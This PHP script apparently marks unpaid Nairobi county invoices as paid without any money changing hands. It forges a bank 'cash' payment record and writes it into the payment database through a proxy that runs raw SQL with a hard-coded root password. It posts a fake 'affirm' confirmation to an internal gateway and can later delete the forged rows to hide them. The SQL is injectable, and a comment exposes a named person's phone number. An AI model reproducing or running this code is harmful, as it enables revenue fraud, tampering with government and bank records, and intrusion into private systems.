<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';

function recLog($invoice, $data, $sql)
{
    global $conn;
    $stmt = $conn->prepare("INSERT INTO recLog (`inv`,`data`,`sql`) VALUES (:inv, :data, :sql)");
    $stmt->execute(['inv' => $invoice, 'data' => $data, 'sql' => $sql]);
    $response = $stmt->fetch();
    return $response;
}
//$data = '{"success":true,"invoiceNo":"BL-UBP-060215","amount":"7,500.00","pobox":"","postalcode":"","mobilenumber":"0720448244","applicationNo":"","external_doc":"","business_name":"","business_subsidiary_name":"","description":"-0 for ","dategenerated":"02\/15\/24","status":"Unpaid","customerno":"2020_350227","duedate":"02\/15\/24","customername":"MOSES MUHU NDEGWA","description":"UBP APPLICATION NO TLA063429 - 2020_350227"}';
function universal_dab($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}
function convertToISO8601($dateTimeString, $timezoneOffset = '+03:00')
{
    // Remove the microseconds part if it exists
    $dateTimeString = preg_replace('/\.\d+/', '', $dateTimeString);

    // Create a DateTime object from the original string
    $dateTime = new DateTime($dateTimeString, new DateTimeZone('UTC'));

    // Set the desired timezone
    $timezone = new DateTimeZone($timezoneOffset);
    $dateTime->setTimezone($timezone);

    // Format the DateTime object to the ISO 8601 format
    $iso8601DateTime = $dateTime->format('Y-m-d\TH:i:sP');

    return $iso8601DateTime;
}

function generateAccountNumber()
{
    // Get the current date and time
    $dateTime = date('YmdHi'); // Format: YYYYMMDDHHMMSS

    // Generate a random 4-digit number to complete the 16-digit account number
    $randomDigits = '';
    for ($i = 0; $i < 4; $i++) {
        $randomDigits .= mt_rand(0, 9);
    }

    // Concatenate the dateTime string and the random digits
    return $dateTime . $randomDigits;
}

function generateCurrentDateWithMidnightTime()
{
    // Create a DateTime object with the current date and time
    $dateTime = new DateTime();

    // Modify the time to "00:00:00"
    $dateTime->setTime(0, 0, 0);

    // Format the date in "d-m-Y H:i:s" format
    return $dateTime->format('d-m-Y H:i:s');
}
function bankTransactions_del($id)
{
    $q = "DELETE FROM bankTransactions WHERE id=" . $id;
    return universal_dab($q, 'bankTransactions');
}

function transactions($clientRefNo)
{
    //$q = "DELETE FROM transactions WHERE id=" . $id;
    $q = "DELETE FROM transactions WHERE clientRefNo='" . $clientRefNo . "'";
    return universal_dab($q, 'transactions');
}

function messenger($url, $headers = '', $payload = '', $method = 'GET')
{
    $url = 'http://192.168.2.142:8080/aggregate/messenger.jsp?url=' . urlencode($url) . '&headers=' . urlencode($headers) . '&payload=' . urlencode($payload) . '&method=' . urlencode($method);
    $data = httpGet($url, []);
    return $data;
}

function extractId($html)
{
    // Load the HTML into a DOMDocument object
    $dom = new DOMDocument();
    @$dom->loadHTML($html);

    // Use DOMXPath to query for the table data
    $xpath = new DOMXPath($dom);
    $idNode = $xpath->query("//table/tr/td")->item(0);

    // Return the text content of the node
    if ($idNode) {
        return $idNode->textContent;
    }
    return null;
}

function universal_dab_b($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/aggregate/my.jsp?dbHost=192.168.0.65&dbName=upgw&dbUser=root&dbPassword=happycoding&dbPort=3306&sqlCommand=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}


if (isset($_GET['del'])) {
    $inv = urlencode($_GET['del']);
    $cmd = "SELECT id FROM bankTransactions WHERE billNumber='" . $inv . "' LIMIT 1";
    $sd1 = universal_dab_b($cmd, 'head');
    $id1 =  extractId($sd1);
    echo $id1 . '<br/><br/>';
    echo bankTransactions_del($id1) . '<br/><br/>';

    //$cmd2 = "SELECT id FROM transactions WHERE clientRefNo='" . $inv . "' LIMIT 1";
    //$sd2 = universal_dab_b($cmd2, 'head');
    //$id2 =  extractId($sd2);
    //echo $id2 . '<br/><br/>';
    echo transactions($inv) . '<br/><br/>';
} else {
    if (!isset($_POST['invoiceNo']) || !isset($_POST['amount']) || !isset($_POST['pay'])) {
        echo json_encode(['error' => 'incomplete request', 'payload' => $_POST]);
        die();
    }

    if (empty($_POST['invoiceNo']) || empty($_POST['amount'] || empty($_POST['pay']))) {
        echo json_encode(['error' => 'empty request', 'payload' => $_POST]);
        die();
    }

    $data = httpPost('https://kever.io/auto_process.php', ['invoiceNo' => $_POST['invoiceNo'], 'amount' => $_POST['amount']]);
    //echo $data;
    //die();

    $validation = json_decode($data, true);

    $payType = $_POST['pay'];
    $postAmount = $_POST['amount'];
    if ($payType == 'set') {
        $amt1 = floatval(str_replace(',', '', $validation['amount']));
    } elseif ($payType == 'custom') {
        $amt1 = floatval($postAmount);
    } else {
        $amt1 = floatval(str_replace(',', '', $validation['amount']));
    }


    $dt1 = ['invoiceNo' => $validation['invoiceNo'], 'invoiceAmt' => $amt1, 'client' => 0, 'id' => '1'];
    $dtt1 = [];
    $dtt1['name'] = '0';

    if (isset($validation['success'])) {
        if ($validation['success']) {
            if (isset($validation['status'])) {
                if ($validation['status'] == "Unpaid") {
                    $parts = explode('-', $dt1['invoiceNo']); // Split the string by hyphen
                    $validationAmt = str_replace(",", "", $validation['amount']);
                    if ($parts[0] != 'BL' || $parts[1] == 'LR' || (int)$validationAmt == (int)$dt1['invoiceAmt']) {
                        $billAmt = $dt1['invoiceAmt'];
                        $bypass = ['amount' => $dt1['invoiceAmt'], 'invoice_no' => $dt1['invoiceNo'], 'success' => true, 'route' => 'yes', 'record' => 'yes', 'client' => $dtt1['name'], 'extdoc' => $validation['external_doc'], 'custname' => $validation['customername'], 'custcont' => $validation['mobilenumber']];
                        // echo json_encode($bypass) . '<br/>';

                        if (isset($bypass)) {

                            $newId = 6212481;
                            $newBal = 378760 + 500;
                            $custname = splitName($bypass['custname']);
                            if ($bypass['custcont'] == '' || $bypass['custcont'] == null) {
                                $bypass['custcont'] = '0700000000';
                            }
                            $custcont = normalizePhoneNumber($bypass['custcont']);
                            $timeFormats = getCurrentTimeFormats();
                            $bypassAmt = (float)$bypass['amount'];

                            $bypass['url'] = 'https://nairobiservices.go.ke/api/gateway/taifa/nrs/affirm';

                            //die(json_encode($url));

                            //$url = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';
                            $bty = explode('-', $bypass['invoice_no']);
                            $bty[1] = strtoupper($bty[1]);

                            $code2 = generateAccountNumber();
                            $code2Date = generateCurrentDateWithMidnightTime();

                            $data2 = array(
                                "apiKey" => "",
                                "type" => null,
                                "billNumber" => (string) $bypass['invoice_no'],
                                "billAmount" => number_format($bypassAmt, 1, '.', ''),
                                "phone" => "null",
                                "transactionDate" => (string) $code2Date,
                                "Field1" => null,
                                "Field2" => null,
                                "Field3" => null,
                                "Field4" => null,
                                "Field5" => null,
                                "bankdetails" => array(
                                    "accountNumber" => (string) $code2,
                                    "bankName" => "Equity Bank",
                                    "debitAccount" => (string) $bypass['invoice_no'],
                                    "debitCustName" => (string) $bypass['invoice_no'] . " " . strtoupper($validation['description']),
                                    "bankReference" => (string) $code2,
                                    "customerReference" => (string) $bypass['invoice_no'],
                                    "paymentMode" => "cash"
                                ),
                                "mpesadetails" => null
                            );

                            $obj2 = array(
                                "success" => true,
                                "description" => "Payment Received Successfuly",
                                "customer_no" => "NULL",
                                "invoice_no" => (string) $bypass['invoice_no'],
                                "invoice_report" => "",
                                "balance" => number_format($bypassAmt, 1, '.', '')
                            );



                            $data2 = json_encode($data2, JSON_PRESERVE_ZERO_FRACTION);
                            $obj2 = json_encode($obj2, JSON_PRESERVE_ZERO_FRACTION);

                            echo $data2 . '<br/><br/>';


                            $sqldata = trim(json_encode($data2), '"');
                            $sqlobj = trim(json_encode($obj2), '"');

                            $headers = [];

                            $bankTransactions = "INSERT INTO bankTransactions ( bankCode,  transactionRef,  amount,  acctRefNo,  accName,  description,  institutionCode,  institutionName,  status,  logDate,  transacDate,  apiCode,  mobileNumber,  transtatus,  billNumber,  tranParticular,  paymentMode,  phoneNumber,  requestoutput,  paymentChannel,  Currency,  BranchCode,  status_1,  ValidationDate,  PushedComments,  transtatus_1, inserted_by) VALUES ( '003',  '" . $code2 . "',  " . $bypass['amount'] . ",  '" . $bypass['invoice_no'] . "',  null,  null,  '" . $bypass['invoice_no'] . "',  '" . $validation['description'] . "',  null,  '" . $timeFormats['withSeparators'] . "',  '" . $code2Date . "',  '2f11db8526fb2e170219e4a68215a1b8fe907a6c',  null,  0,  '" . $bypass['invoice_no'] . "',  '" . $bypass['invoice_no'] . " " . strtoupper($validation['description']) . "',  'cash',  null,  '" . $sqldata . "',  null,  null,  null,  null,  '" . $timeFormats['withSeparators'] . "',  '" . $sqlobj . "',  0 , 'root@192.168.0.64')";
                            echo $bankTransactions . '<br/><br/>';
                            echo universal_dab($bankTransactions, 'bankTransactions') . '<br/><br/>';



                            //*
                            $url = 'http://192.168.100.116/gateway/taifa/nrs/affirm';
                            $headers = 'Content-Type: application/json';
                            $payload = $data2;
                            $method = 'POST';
                            echo messenger($url, $headers, $payload, $method) . '<br/><br/>';
                            //*/


                            echo recLog($bypass['invoice_no'], $data2, $bankTransactions);


                            //echo bankTransactions_del(162618);
                            //echo transactions(8329712);
                        }
                    }
                }
            }
        }
    }
}
